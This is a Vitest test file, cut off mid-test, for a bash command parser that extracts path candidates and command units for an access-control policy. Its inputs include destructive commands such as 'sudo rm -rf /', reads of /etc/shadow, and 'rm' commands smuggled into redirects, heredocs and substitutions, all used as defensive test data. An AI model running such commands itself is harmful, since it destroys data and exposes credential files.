import { homedir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

// Mock node:fs so realpathSync (used by canonicalizePath) is controllable.
// Default is identity so all existing lexical tests are unaffected.
// Every other fs binding passes through to the real module, so filesystem-
// backed helpers (lstatSync, mkdtempSync, symlinkSync, …) stay usable here.
const realpathSync = vi.hoisted(() =>
  vi.fn<(path: string) => string>((p) => p),
);
vi.mock("node:fs", async () => {
  const actual = await vi.importActual<typeof import("node:fs")>("node:fs");
  return {
    ...actual,
    realpathSync,
    default: { ...actual, realpathSync },
  };
});

import {
  resetWarmBashParser,
  warmBashParser,
} from "#src/access-intent/bash/parser";
import { BashProgram } from "#src/access-intent/bash/program";
import { UNPROVEN_EFFECT } from "#src/access-intent/effect";
import { pathFlavorForPlatform, win32PathFlavor } from "#src/path/path-flavor";
import { PathNormalizer } from "#src/path/path-normalizer";
import { createTmpFixture } from "#test/helpers/tmp-fixture";

describe("BashProgram", () => {
  describe("pathRuleCandidates", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );

    beforeEach(() => {
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });

    describe("a token spelled from a HOME the program reassigns", () => {
      /** Each rule candidate's token. */
      async function candidateTokensOf(command: string): Promise<string[]> {
        const program = await BashProgram.parse(command, normalizer);
        return program.pathRuleCandidates().map(({ token }) => token);
      }

      it.each([
        'HOME=/etc; cat "$HOME/shadow"',
        "HOME=/etc; cat ${HOME}/shadow",
        "HOME=/etc; cat ~/shadow",
      ])("leaves the path surface for %s", async (command) => {
        expect(await candidateTokensOf(command)).toEqual([]);
      });

      it("keeps a token spelled from a HOME nothing reassigns", async () => {
        expect(await candidateTokensOf('cat "$HOME/shadow"')).toEqual([
          join(homedir(), "shadow"),
        ]);
      });
    });

    describe("a redirect's target is projected by its role (#609)", () => {
      /** Each rule candidate's token, effect, and policy match values. */
      async function ruleCandidatesOf(command: string) {
        const program = await BashProgram.parse(command, normalizer);
        return program.pathRuleCandidates().map(({ token, effect, path }) => ({
          token,
          effect: effect.effect,
          matchValues: path.matchValues(),
        }));
      }

      /** Each rule candidate's token alone. */
      async function ruleTokensOf(command: string): Promise<string[]> {
        const program = await BashProgram.parse(command, normalizer);
        return program.pathRuleCandidates().map(({ token }) => token);
      }

      it("projects a bare output target that does not exist yet", async () => {
        expect(await ruleCandidatesOf("cat /etc/hosts > out.txt")).toEqual([
          {
            token: "/etc/hosts",
            effect: "read",
            matchValues: ["/etc/hosts"],
          },
          {
            token: "out.txt",
            effect: "write",
            matchValues: [join(cwd, "out.txt"), "out.txt"],
          },
        ]);
      });

      it("projects a bare input target that does not exist", async () => {
        expect(await ruleCandidatesOf("sort < in.txt")).toEqual([
          {
            token: "in.txt",
            effect: "read",
            matchValues: [join(cwd, "in.txt"), "in.txt"],
          },
        ]);
      });

      it("keeps only the literal value after a non-literal cd", async () => {
        expect(await ruleCandidatesOf('cd "$D" && echo hi > out.txt')).toEqual([
          { token: "out.txt", effect: "write", matchValues: ["out.txt"] },
        ]);
      });

      it("does not admit the words the grammar appends after the target", async () => {
        // `-type` and `d` are `find`'s arguments; only `/dev/null` is the
        // redirect's target (#977).
        expect(await ruleTokensOf("find /usr 2>/dev/null -type d")).toEqual([
          "/usr",
          "/dev/null",
        ]);
      });

      it("does not admit a target computed at run time", async () => {
        expect(await ruleTokensOf('echo hi > "$OUT"')).toEqual([]);
      });

      it("does not admit a redirect the parse could not resolve", async () => {
        expect(await ruleTokensOf("cat <> rw.txt")).toEqual([]);
      });
    });

    describe("a subshell timed by time", () => {
      /** Each rule candidate's token, effect, and policy match values. */
      async function ruleCandidatesOf(command: string) {
        const program = await BashProgram.parse(command, normalizer);
        return program.pathRuleCandidates().map(({ token, effect, path }) => ({
          token,
          effect: effect.effect,
          matchValues: path.matchValues(),
        }));
      }

      it("resolves a token after the subshell's cd as the bare subshell does", async () => {
        const timed = await ruleCandidatesOf("time ( cd sub && cat ./x )");
        expect(timed).toEqual(await ruleCandidatesOf("( cd sub && cat ./x )"));
        expect(timed.map(({ matchValues }) => matchValues[0])).toEqual([
          join(cwd, "sub/x"),
        ]);
      });

      it("projects the target of a redirect the time command hosts", async () => {
        expect(await ruleCandidatesOf("2>err.txt time (rm x)")).toEqual([
          {
            token: "err.txt",
            effect: "write",
            matchValues: [join(cwd, "err.txt"), "err.txt"],
          },
        ]);
      });
    });

    describe("operands of nested commands hosted in a redirect (#741)", () => {
      it("projects the operand of a redirect-hosted command", async () => {
        const program = await BashProgram.parse(
          "echo hi > $(cat /etc/shadow)",
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "/etc/shadow",
        ]);
      });

      it("does not promote a bare inner token that names nothing", async () => {
        const program = await BashProgram.parse(
          "echo hi > $(rm nonexistent-file)",
          normalizer,
        );
        expect(program.pathRuleCandidates()).toEqual([]);
      });
    });

    describe("operands a statement names directly (#839)", () => {
      it("projects a for loop's word-list operand", async () => {
        const program = await BashProgram.parse(
          "for f in /etc/shadow; do cat $f; done",
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "/etc/shadow",
        ]);
      });

      it("projects a case subject", async () => {
        const program = await BashProgram.parse(
          "case /etc/shadow in a) echo b;; esac",
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "/etc/shadow",
        ]);
      });

      it("leaves a case arm's pattern unprojected", async () => {
        // A `case` pattern is a glob matched against the subject string, not a
        // path anything touches.
        const program = await BashProgram.parse(
          "case $x in /etc/passwd) echo b;; esac",
          normalizer,
        );
        expect(program.pathRuleCandidates()).toEqual([]);
      });

      it("resolves a word-list operand against the effective directory", async () => {
        const program = await BashProgram.parse(
          "cd nested && for f in src/file.txt; do echo; done",
          normalizer,
        );
        const candidate = program
          .pathRuleCandidates()
          .find(({ token }) => token === "src/file.txt");
        expect(candidate?.path.matchValues()).toEqual([
          "/projects/my-app/nested/src/file.txt",
          "nested/src/file.txt",
          "src/file.txt",
        ]);
      });

      it("attributes a statement operand as unproven", async () => {
        const program = await BashProgram.parse(
          "for f in /etc/shadow; do echo; done",
          normalizer,
        );
        expect(
          program.pathRuleCandidates().map(({ effect }) => effect),
        ).toEqual([UNPROVEN_EFFECT]);
      });
    });

    describe("operands of a command hosted in a prefix position (#742)", () => {
      it.each([
        ["a substitution as the whole command", "$(cat /etc/shadow)"],
        ["a backtick substitution as the whole command", "`cat /etc/shadow`"],
        [
          "a substitution in a while condition",
          "while $(cat /etc/shadow); do echo a; done",
        ],
        [
          "a substitution in an if condition",
          "if $(cat /etc/shadow); then echo a; fi",
        ],
        [
          "a substitution in an until condition",
          "until $(cat /etc/shadow); do echo a; done",
        ],
        [
          "a substitution in an env-var prefix",
          "FOO=$(cat /etc/shadow) echo hi",
        ],
        [
          "a substitution in the env-var prefix of a pattern-first command",
          "FOO=$(cat /etc/shadow) grep -f p x",
        ],
      ])("projects the operand of %s", async (_label, command) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(
          program.pathRuleCandidates().map(({ token }) => token),
        ).toContain("/etc/shadow");
      });

      it("leaves a prefix assignment's literal value unprojected", async () => {
        // The value is assigned, never accessed — only a *hosted execution* in
        // that position runs, and only its operands are candidates.
        const program = await BashProgram.parse(
          "FOO=/etc/shadow echo hi",
          normalizer,
        );
        expect(program.pathRuleCandidates()).toEqual([]);
      });

      it("projects an argument-position operand exactly as before", async () => {
        const program = await BashProgram.parse(
          "echo $(cat /etc/shadow)",
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "/etc/shadow",
        ]);
      });
    });

    it("adds absolute and relative policy values for relative tokens", async () => {
      const program = await BashProgram.parse("cat src/foo.ts", normalizer);
      const candidates = program.pathRuleCandidates();
      expect(candidates.map(({ token }) => token)).toEqual(["src/foo.ts"]);
      expect(candidates[0].path.matchValues()).toEqual([
        "/projects/my-app/src/foo.ts",
        "src/foo.ts",
      ]);
      expect(candidates[0].path.value()).toBe("/projects/my-app/src/foo.ts");
    });

    it("resolves tokens after literal cd against the effective directory", async () => {
      const program = await BashProgram.parse(
        "cd nested && cat src/file.txt",
        normalizer,
      );
      const fileCandidate = program
        .pathRuleCandidates()
        .find((candidate) => candidate.token === "src/file.txt");
      expect(fileCandidate?.path.matchValues()).toEqual([
        "/projects/my-app/nested/src/file.txt",
        "nested/src/file.txt",
        "src/file.txt",
      ]);
      expect(fileCandidate?.path.value()).toBe(
        "/projects/my-app/nested/src/file.txt",
      );
    });

    it("adds the canonical alias for a symlinked token (#486)", async () => {
      // /projects/my-app/src/foo.ts is a symlink to /vault/foo.ts.
      realpathSync.mockImplementation((p: string) =>
        p === "/projects/my-app/src/foo.ts" ? "/vault/foo.ts" : p,
      );
      const program = await BashProgram.parse("cat src/foo.ts", normalizer);
      const candidate = program.pathRuleCandidates()[0];
      expect(candidate.path.matchValues()).toEqual([
        "/projects/my-app/src/foo.ts",
        "src/foo.ts",
        "/vault/foo.ts",
      ]);
    });

    it("does not absolute-allow relative tokens after unknown cd", async () => {
      const program = await BashProgram.parse(
        'cd "$DIR" && cat src/foo.ts',
        normalizer,
      );
      const fileCandidate = program
        .pathRuleCandidates()
        .find((candidate) => candidate.token === "src/foo.ts");
      expect(fileCandidate?.path.matchValues()).toEqual(["src/foo.ts"]);
      expect(fileCandidate?.path.value()).toBe("src/foo.ts");
    });

    it("keeps an unknown-cd token literal-only even when it would resolve a symlink (#393)", async () => {
      // A canonical alias here would resolve against the wrong (unknown) base.
      realpathSync.mockImplementation(() => "/somewhere/else");
      const program = await BashProgram.parse(
        'cd "$DIR" && cat src/foo.ts',
        normalizer,
      );
      const fileCandidate = program
        .pathRuleCandidates()
        .find((candidate) => candidate.token === "src/foo.ts");
      expect(fileCandidate?.path.matchValues()).toEqual(["src/foo.ts"]);
      expect(fileCandidate?.path.boundaryValue()).toBe("");
    });

    describe("glob-bearing path tokens (#821)", () => {
      it("projects a bracket glob in a relative token", async () => {
        const program = await BashProgram.parse(
          "cat src/[s]ecret.env",
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "src/[s]ecret.env",
        ]);
      });

      it("projects a dot-star glob in an absolute token", async () => {
        const program = await BashProgram.parse(
          "rm -rf /tmp/tmp.*",
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "/tmp/tmp.*",
        ]);
      });
    });

    describe("existence-probe bare-token promotion (#645)", () => {
      // Candidacy comes from the filesystem, so these run against a real
      // tmpdir cwd with real lstat/realpath rather than the fake cwd above.
      const tmp = createTmpFixture();
      let root: string;
      let probeNormalizer: PathNormalizer;

      beforeEach(async () => {
        const actual =
          await vi.importActual<typeof import("node:fs")>("node:fs");
        realpathSync.mockImplementation(actual.realpathSync);
        // Canonicalize the root: on macOS the tmpdir is itself a symlink, so a
        // lexical root would disagree with every canonical form derived below.
        root = actual.realpathSync(tmp.dir("pi-perm-bash-"));
        probeNormalizer = new PathNormalizer(
          pathFlavorForPlatform(process.platform),
          root,
        );
      });

      afterEach(() => {
        tmp.cleanup();
      });

      it("promotes a bare token naming an existing file", async () => {
        tmp.file(root, "id_rsa", "key");
        const program = await BashProgram.parse("cat id_rsa", probeNormalizer);
        const candidates = program.pathRuleCandidates();
        expect(candidates.map(({ token }) => token)).toEqual(["id_rsa"]);
        expect(candidates[0].path.matchValues()).toEqual([
          join(root, "id_rsa"),
          "id_rsa",
        ]);
      });

      it("drops a bare token naming nothing — `git status` stays silent (#509)", async () => {
        const program = await BashProgram.parse("git status", probeNormalizer);
        expect(program.pathRuleCandidates()).toHaveLength(0);
      });

      it("drops every bare word of a command referencing no real file", async () => {
        const program = await BashProgram.parse(
          "npm run build && git checkout main",
          probeNormalizer,
        );
        expect(program.pathRuleCandidates()).toHaveLength(0);
      });

      it("promotes a bare symlink and carries its target as a match value", async () => {
        // The issue's second repro shape: a_sym -> .some.secret, where the rule
        // names the target. Raw-token matching could never see this.
        const secret = tmp.file(root, ".some.secret", "s3cret");
        tmp.symlink(root, "a_sym", secret);
        const program = await BashProgram.parse("cat a_sym", probeNormalizer);
        const candidate = program
          .pathRuleCandidates()
          .find((c) => c.token === "a_sym");
        expect(candidate?.path.matchValues()).toContain(
          join(root, ".some.secret"),
        );
      });

      it("promotes a bare token naming a directory", async () => {
        tmp.subdir(root, "vault");
        const program = await BashProgram.parse("ls vault", probeNormalizer);
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "vault",
        ]);
      });

      it("promotes a dangling symlink — the link is the named operand", async () => {
        tmp.symlink(root, "dangling", join(root, "gone"));
        const program = await BashProgram.parse(
          "cat dangling",
          probeNormalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "dangling",
        ]);
      });

      it("keeps a promoted token literal-only after an unknown cd (#393)", async () => {
        tmp.file(root, "id_rsa", "key");
        const program = await BashProgram.parse(
          'cd "$DIR" && cat id_rsa',
          probeNormalizer,
        );
        // An unknown base cannot be probed against a known directory, so the
        // token stays unpromoted rather than resolving against the wrong cwd.
        expect(program.pathRuleCandidates()).toHaveLength(0);
      });

      it("does not make a revision range a rule candidate after an unknown cd", async () => {
        const program = await BashProgram.parse(
          "cd ~/x && git log v1..v2",
          probeNormalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "~/x",
        ]);
      });

      it("does not double-promote a token the shape gate already accepts", async () => {
        tmp.file(root, "id_rsa", "key");
        const program = await BashProgram.parse(
          "cat ./id_rsa",
          probeNormalizer,
        );
        expect(program.pathRuleCandidates()).toHaveLength(1);
      });

      it("probes a bare token against the effective directory after a literal cd", async () => {
        const nested = tmp.subdir(root, "nested");
        tmp.file(nested, "inner.txt", "x");
        const program = await BashProgram.parse(
          "cd nested && cat inner.txt",
          probeNormalizer,
        );
        const candidate = program
          .pathRuleCandidates()
          .find((c) => c.token === "inner.txt");
        expect(candidate?.path.matchValues()).toContain(
          join(root, "nested", "inner.txt"),
        );
      });

      it("consults no policy — promotion needs no matcher argument", async () => {
        tmp.file(root, "id_rsa", "key");
        const program = await BashProgram.parse("cat id_rsa", probeNormalizer);
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "id_rsa",
        ]);
      });
    });

    describe("resolved shell expansions (#694)", () => {
      it("resolves ${HOME}/… instead of fabricating a cwd-relative path", async () => {
        const program = await BashProgram.parse(
          'ls "${HOME}/somewhere"',
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          join(homedir(), "somewhere"),
        ]);
      });

      it("keeps a $PWD token literal-only after a non-literal cd", async () => {
        // `$PWD` becomes the base-relative `.`, so it inherits the #393
        // unknown-base treatment rather than resolving against the wrong
        // directory — and never fabricates `<cwd>/$PWD/x`.
        const program = await BashProgram.parse(
          'cd "$DIR" && ls "$PWD/x"',
          normalizer,
        );
        const candidate = program
          .pathRuleCandidates()
          .find(({ token }) => token === "./x");
        expect(candidate?.path.matchValues()).toEqual(["./x"]);
        expect(candidate?.path.boundaryValue()).toBe("");
      });

      it("leaves a variable outside the resolvable set unresolved", async () => {
        const program = await BashProgram.parse('ls "$CONFIG/x"', normalizer);
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "$CONFIG/x",
        ]);
      });
    });
  });

  describe("commands", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );

    it("returns a single-element list for a lone command", async () => {
      const program = await BashProgram.parse("npm install pkg", normalizer);
      expect(program.commands()).toEqual([{ text: "npm install pkg" }]);
    });

    it("splits an && chain", async () => {
      const program = await BashProgram.parse("cd /p && npm i x", normalizer);
      expect(program.commands()).toEqual([
        { text: "cd /p" },
        { text: "npm i x" },
      ]);
    });

    it("splits || , ; and & separators", async () => {
      expect(
        (await BashProgram.parse("a || b", normalizer)).commands(),
      ).toEqual([{ text: "a" }, { text: "b" }]);
      expect((await BashProgram.parse("a ; b", normalizer)).commands()).toEqual(
        [{ text: "a" }, { text: "b" }],
      );
      expect((await BashProgram.parse("a & b", normalizer)).commands()).toEqual(
        [{ text: "a" }, { text: "b" }],
      );
    });

    it("splits a pipeline into its commands", async () => {
      const program = await BashProgram.parse("cat f | grep b", normalizer);
      expect(program.commands()).toEqual([
        { text: "cat f" },
        { text: "grep b" },
      ]);
    });

    it("splits newline-separated commands", async () => {
      const program = await BashProgram.parse("foo\nbar", normalizer);
      expect(program.commands()).toEqual([{ text: "foo" }, { text: "bar" }]);
    });

    it("does not split operators inside quotes", async () => {
      const program = await BashProgram.parse("echo 'x && y'", normalizer);
      expect(program.commands()).toEqual([{ text: "echo 'x && y'" }]);
    });

    it("captures the command of a redirected statement without the redirect", async () => {
      const program = await BashProgram.parse(
        "npm install > out.txt",
        normalizer,
      );
      expect(program.commands()).toEqual([{ text: "npm install" }]);
    });

    describe("a redirect hosted inside the command", () => {
      it.each([
        ["2>/dev/null git push --force", "git push --force"],
        ["FOO=1 2>/dev/null git push --force", "git push --force"],
        ["git <<< x push --force", "git push --force"],
        ["cat f <<< hi", "cat f"],
      ])("leaves the redirect out of %s", async (command, text) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([{ text }]);
      });

      it("reads the head word past a leading redirect", async () => {
        const program = await BashProgram.parse(
          ">/dev/null bash -c 'rm -rf /tmp/x'",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "bash -c 'rm -rf /tmp/x'",
            wrapperKind: "opaque-payload",
            executedUnit: "rm -rf /tmp/x",
            // The path projection reads the payload as a relative path.
            spellings: ["bash -c /projects/my-app/rm -rf /tmp/x"],
          },
        ]);
      });

      it("names what an indirection wrapper runs past a leading redirect", async () => {
        const program = await BashProgram.parse(
          "2>/dev/null sudo rm -rf /",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "sudo rm -rf /",
            wrapperKind: "indirection",
            executedUnit: "rm -rf /",
          },
        ]);
      });
    });

    describe("a redirect the grammar hung the command's words on", () => {
      it.each([
        ["git 2>/dev/null push --force", "git push --force"],
        ["git push 2>&1 --force", "git push --force"],
        ["grep pat 2>/dev/null f.txt", "grep pat f.txt"],
        ["cmd >&- arg", "cmd arg"],
      ])("keeps the words of %s in its unit", async (command, text) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([{ text }]);
      });

      it("gives the words to the last command of a list", async () => {
        const program = await BashProgram.parse(
          "cd a && git 2>/dev/null push --force",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "cd a" },
          { text: "git push --force" },
        ]);
      });

      it("names what an indirection wrapper runs from the words", async () => {
        const program = await BashProgram.parse(
          "sudo 2>/dev/null rm -rf /",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "sudo rm -rf /",
            wrapperKind: "indirection",
            executedUnit: "rm -rf /",
          },
        ]);
      });
    });

    describe("a heredoc the grammar hung the command's words on", () => {
      it("keeps the words in the command's unit", async () => {
        const program = await BashProgram.parse(
          "git <<EOF push --force\nb\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([{ text: "git push --force" }]);
      });

      it("names what an indirection wrapper runs from the words", async () => {
        const program = await BashProgram.parse(
          "sudo <<EOF rm -rf /\nb\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "sudo rm -rf /",
            wrapperKind: "indirection",
            executedUnit: "rm -rf /",
          },
        ]);
      });
    });

    describe("the rest of a heredoc's line", () => {
      it.each([
        ["a piped command", "cat <<EOF | rm -rf /tmp/x"],
        ["an `&&` command", "cat <<EOF && rm -rf /tmp/x"],
      ])("enumerates %s as its own unit", async (_label, line) => {
        const program = await BashProgram.parse(`${line}\nb\nEOF`, normalizer);
        expect(program.commands()).toEqual([
          { text: "cat" },
          { text: "rm -rf /tmp/x" },
        ]);
      });

      it("enumerates every stage of a pipeline joined by `&&`", async () => {
        const program = await BashProgram.parse(
          "cat <<EOF && ls | rm -rf /tmp/x\nb\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "cat" },
          { text: "ls" },
          { text: "rm -rf /tmp/x" },
        ]);
      });

      it("keeps the operand a heredoc absorbed while enumerating its tail", async () => {
        // The first unit is the one this repo's project deny rule is spelled
        // against (#941); the tail adds a unit without touching it.
        const program = await BashProgram.parse(
          "git commit -q -F - <<'EOF' && git log --oneline -1\nfeat: x\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "git commit -q -F" },
          { text: "git log --oneline -1" },
        ]);
      });

      it("withholds the core-reader exemption when a tail redirect writes a file", async () => {
        const program = await BashProgram.parse(
          "xargs grep foo <<EOF > /tmp/o\nb\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "xargs grep foo",
            wrapperKind: "indirection",
            executedUnit: "grep foo",
          },
        ]);
      });

      it("withholds it when a later command's redirect hangs off the heredoc's list", async () => {
        // The grammar groups `xargs grep foo < in && a > /tmp/o | b` as
        // `(… && a > /tmp/o) | b`, charging the write to the whole list; the
        // heredoc spelling is grouped the same way, so it is no looser.
        const program = await BashProgram.parse(
          "xargs grep foo <<EOF && a > /tmp/o | b\nb\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "xargs grep foo",
            wrapperKind: "indirection",
            executedUnit: "grep foo",
          },
          { text: "a" },
          { text: "b" },
        ]);
      });

      it("withholds it when a redirect ends a pipeline joined after the heredoc", async () => {
        // The grammar parses the tail `a | b | c > /tmp/o` as
        // `a | ((b | c) > /tmp/o)`, but the same text at the top level as
        // `(… | c) > /tmp/o`, which charges the write to `xargs` too.
        const program = await BashProgram.parse(
          "xargs grep foo <<EOF && a | b | c > /tmp/o\nb\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "xargs grep foo",
            wrapperKind: "indirection",
            executedUnit: "grep foo",
          },
          { text: "a" },
          { text: "b" },
          { text: "c" },
        ]);
      });

      it("withholds a wrapped reader's exemption once its argument's HOME is reassigned", async () => {
        const program = await BashProgram.parse(
          'HOME=-delete; xargs find "$HOME"',
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "HOME=-delete" },
          {
            text: 'xargs find "$HOME"',
            wrapperKind: "indirection",
            executedUnit: 'find "$HOME"',
          },
        ]);
      });

      it("keeps the core-reader exemption when a tail redirect duplicates a descriptor", async () => {
        const program = await BashProgram.parse(
          "xargs grep foo <<EOF >&2\nb\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "xargs grep foo",
            wrapperKind: "indirection",
            executedUnit: "grep foo",
            floorExemption: "core-reader",
          },
        ]);
      });

      it("still enumerates a substitution in the heredoc's body", async () => {
        const program = await BashProgram.parse(
          "cat <<EOF | tail\n$(rm e)\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "cat" },
          { text: "rm e", context: "command_substitution" },
          { text: "tail" },
        ]);
      });
    });

    describe("the unit text of a command with no hosted redirect", () => {
      it("keeps the source spacing verbatim", async () => {
        const command = "git  push \\\n  --force";
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([{ text: command }]);
      });

      it("leaves out the operand a heredoc absorbs", async () => {
        // A project deny rule is spelled against this unit text (#941).
        const program = await BashProgram.parse(
          "git commit -F - <<'EOF'\nfeat: x\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([{ text: "git commit -F" }]);
      });

      it("keeps the operand a plain file argument supplies", async () => {
        const program = await BashProgram.parse(
          "git commit -F /tmp/msg.txt",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "git commit -F /tmp/msg.txt" },
        ]);
      });
    });

    describe("commands hosted in a redirect target (#741)", () => {
      it.each([
        ["echo hi > $(rm x)", "echo hi", "rm x"],
        ["echo hi >> $(rm b)", "echo hi", "rm b"],
        ["echo hi 2> `rm d`", "echo hi", "rm d"],
        ["echo hi &> $(rm q)", "echo hi", "rm q"],
      ])("descends into %s", async (command, enclosing, inner) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([
          { text: enclosing },
          { text: inner, context: "command_substitution" },
        ]);
      });

      it("descends into a process substitution read as input", async () => {
        const program = await BashProgram.parse("cat < <(rm c)", normalizer);
        expect(program.commands()).toEqual([
          { text: "cat" },
          { text: "rm c", context: "process_substitution" },
        ]);
      });

      it("descends into a substitution concatenated into the destination", async () => {
        const program = await BashProgram.parse(
          "echo hi > ${DIR}/$(rm z)",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "echo hi" },
          { text: "rm z", context: "command_substitution" },
        ]);
      });

      it("descends into a redirect on a chained command", async () => {
        const program = await BashProgram.parse(
          "cd /p && echo hi > $(rm x)",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "cd /p" },
          { text: "echo hi" },
          { text: "rm x", context: "command_substitution" },
        ]);
      });

      it("leaves a plain redirect destination unenumerated", async () => {
        const program = await BashProgram.parse(
          "echo hi > out.txt",
          normalizer,
        );
        expect(program.commands()).toEqual([{ text: "echo hi" }]);
      });
    });

    describe("commands hosted in a heredoc body (#741)", () => {
      it("descends into an interpolating heredoc body", async () => {
        const program = await BashProgram.parse(
          "cat <<EOF\n$(rm e)\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "cat" },
          { text: "rm e", context: "command_substitution" },
        ]);
      });

      it.each([
        ["single-quoted", "cat <<'EOF'\n$(rm e)\nEOF"],
        ["double-quoted", 'cat <<"EOF"\n$(rm e)\nEOF'],
      ])(
        "leaves a %s heredoc body literal, since it does not interpolate",
        async (_label, command) => {
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([{ text: "cat" }]);
        },
      );

      it("descends into a herestring substitution", async () => {
        const program = await BashProgram.parse("cat <<< $(rm x)", normalizer);
        expect(program.commands()).toEqual([
          { text: "cat" },
          { text: "rm x", context: "command_substitution" },
        ]);
      });

      it("leaves a heredoc body carrying no substitution unenumerated", async () => {
        const program = await BashProgram.parse(
          "cat <<EOF\nplain text\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([{ text: "cat" }]);
      });
    });

    describe("commands hosted by a declaration, test, or assignment (#742)", () => {
      it.each([
        ["local x=$(rm y)", "rm y"],
        ["export X=$(rm x)", "rm x"],
        ["declare x=$(rm y)", "rm y"],
        ["readonly Y=$(rm z)", "rm z"],
        ["typeset q=$(rm w)", "rm w"],
        ["[[ $(rm x) ]]", "rm x"],
        ["[ $(rm x) ]", "rm x"],
        ["unset $(rm x)", "rm x"],
        ["X=$(rm q)", "rm q"],
        ["X=`rm q`", "rm q"],
      ])("descends into %s", async (command, inner) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([
          { text: command },
          { text: inner, context: "command_substitution" },
        ]);
      });

      it("descends into a process substitution hosted by a declaration", async () => {
        const program = await BashProgram.parse("local f=<(rm y)", normalizer);
        expect(program.commands()).toEqual([
          { text: "local f=<(rm y)" },
          { text: "rm y", context: "process_substitution" },
        ]);
      });

      it("leaves a declaration hosting no execution alone", async () => {
        const program = await BashProgram.parse("local x=1", normalizer);
        expect(program.commands()).toEqual([{ text: "local x=1" }]);
      });
    });

    describe("an unparsed ERROR node (#742)", () => {
      it.each([
        [
          "an unterminated heredoc, whose body re-parses as garbage",
          "cat <<'EOF'\nsee `rm -rf x` here",
          "cat",
          "<<'EOF'\nsee `rm -rf x` here",
          // The heredoc's line, salvaged without its heredoc; not its body.
          [{ text: "cat", parseUnresolved: true, salvaged: true }],
        ],
        ["an unbalanced quote", 'echo "$(rm x)', "echo", '"$(rm x)', []],
      ])(
        "emits %s whole, taking nothing from inside it",
        async (_label, command, enclosing, blob, salvaged) => {
          // Tree-sitter's error recovery *invents* structure, so a node type
          // inside an ERROR subtree is not evidence that a command runs.
          // The blob carries the #840 marker and the clean enclosing command
          // does not: the `ERROR` is the program's own child, so the sibling
          // command it follows is untouched.
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([
            { text: enclosing },
            { text: blob, parseUnresolved: true },
            ...salvaged,
          ]);
        },
      );

      it("emits an unterminated control-flow statement whole", async () => {
        const program = await BashProgram.parse(
          "for f in a; do rm $f",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "for f in a; do rm $f", parseUnresolved: true },
        ]);
      });
    });

    describe("commands inside a for loop (#742)", () => {
      it("emits the body's commands, but not the loop variable or word list", async () => {
        // `f`, `a`, and `b` are operand words, not commands: emitting them
        // would name `a` as the offending *command* in a prompt.
        const program = await BashProgram.parse(
          "for f in a b; do rm $f; done",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "for f in a b; do rm $f; done" },
          { text: "rm $f" },
        ]);
      });

      it("emits every command of a multi-statement body", async () => {
        const program = await BashProgram.parse(
          "for f in a; do cd /t && rm $f; done",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "for f in a; do cd /t && rm $f; done" },
          { text: "cd /t" },
          { text: "rm $f" },
        ]);
      });

      it("descends into a substitution in the word list", async () => {
        const program = await BashProgram.parse(
          "for f in $(rm x); do echo $f; done",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "for f in $(rm x); do echo $f; done" },
          { text: "rm x", context: "command_substitution" },
          { text: "echo $f" },
        ]);
      });
    });

    describe("commands inside the remaining compound statements (#742)", () => {
      // Each row is written as a real parse of the construct rather than as an
      // assertion about a node-type set, because the node-type names are
      // external facts about the tree-sitter-bash grammar: `select` parses as
      // `for_statement` and `until` as `while_statement`, and a typo in a set
      // fails invisibly.
      it.each([
        ["if true; then rm y; fi", ["true", "rm y"]],
        [
